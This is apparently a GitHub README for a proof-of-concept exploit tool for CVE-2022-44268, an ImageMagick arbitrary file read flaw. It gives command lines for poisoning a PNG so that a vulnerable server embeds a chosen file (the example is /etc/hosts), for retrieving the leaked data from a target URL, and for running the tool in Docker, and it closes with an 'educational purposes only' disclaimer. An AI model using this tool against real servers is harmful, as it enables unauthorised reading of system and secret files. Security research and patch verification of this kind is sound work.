# CVE-2022-44268 🧙‍♂️

CVE-2022-44268 ImageMagick Arbitrary File Read - Proof of Concept exploit

### Video 📼
https://youtu.be/quKxwNAMBIA


## Usage 🛠 

Poison the image ☣️
```
python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/hosts --output poisoned.png
```
```
Upload poisoned PNG image.
```
Check if exploit was successful 🗡
```
python3 CVE-2022-44268.py --url http://vulnerable-imagemagick.com/uploads/vulnerable.png
```

## Running from Docker :whale:

Build
```
docker build -t cve-2022-44268 .
```

Run
```
docker run -v $(pwd)/data:/data -ti cve-2022-44268 --image /data/random.png --file-to-read "/etc/hosts" --output /data/poisoned.png
```

## Parameters 🧰 

Parameter | Description | Type
------------ | ------------- | -------------
--url | The URL of the uploaded PNG image | String
--image | Input PNG file | File
--output | Output PNG file | File
--file-to-read | File to read from vulnerable host | String


## Contact Me📇

[Twitter - Milan Jovic](https://twitter.com/milanshiftsec)

[LinkedIn - Milan Jovic](https://www.linkedin.com/in/milan-jovic-sec/)

[ShiftSecurityConsulting](https://shiftsecurityconsulting.com)

#### Educational purposes only and cannot be used for law violation or personal gain.
#### The author of this project is not responsible for any possible harm caused by the materials of this project.
#### More details: https://www.metabaseq.com/imagemagick-zero-days/
